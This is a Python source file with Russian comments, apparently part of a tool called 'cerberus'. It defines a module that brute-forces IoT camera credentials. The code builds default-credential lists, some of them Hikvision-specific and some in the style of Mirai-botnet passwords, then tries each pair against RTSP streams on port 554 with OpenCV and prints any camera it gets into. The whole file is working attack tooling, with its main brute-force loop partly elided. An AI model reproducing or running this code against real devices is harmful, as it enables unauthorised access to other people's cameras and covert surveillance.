import cv2
import asyncio
from concurrent.futures import ThreadPoolExecutor

class BruteModule:
    def __init__(self, wordlist="/usr/share/cerberus/data/wordlists/iot_default.txt"):
        self.wordlist = self._load_wordlist(wordlist)

    def _load_wordlist(self, path):
        # В реальности здесь 500+ пар
        return [("admin", "admin"), ("admin", "12345"), ("root", "root"), ("admin", "password")]

    def generate_smart_list(self, vendor, ip):
        """Генерация паролей на основе модели и IP"""
        base = ["admin", "root", "support", "user", "operator"]
        mutations = ["12345", "123456", "admin", "password", "tlvk746", "vizxv"]
        
        # Если это Hikvision
        if vendor and "Hik" in vendor:
            mutations += ["12345a", "hik12345", "admin12345"]
        
        smart_list = []
        for b in base:
            for m in mutations:
                smart_list.append((b, m))
        return smart_list

    async def run(self, host):
        vendor = host.get('vendor', '')
        self.creds = self.generate_smart_list(vendor, host['ip'])
        # ... (логика брута)

    async def brute_rtsp(self, ip):
        loop = asyncio.get_event_loop()
        with ThreadPoolExecutor() as pool:
            for user, password in self.wordlist:
                url = f"rtsp://{user}:{password}@{ip}:554/live"
                # Используем OpenCV для проверки доступа (только первый кадр)
                result = await loop.run_in_executor(pool, self.check_auth, url)
                if result:
                    print(f"  [!] VULNERABLE RTSP: {user}:{password} @ {ip}")
                    return True
        return False

    def check_auth(self, url):
        cap = cv2.VideoCapture(url)
        if cap.isOpened():
            cap.release()
            return True
        return False
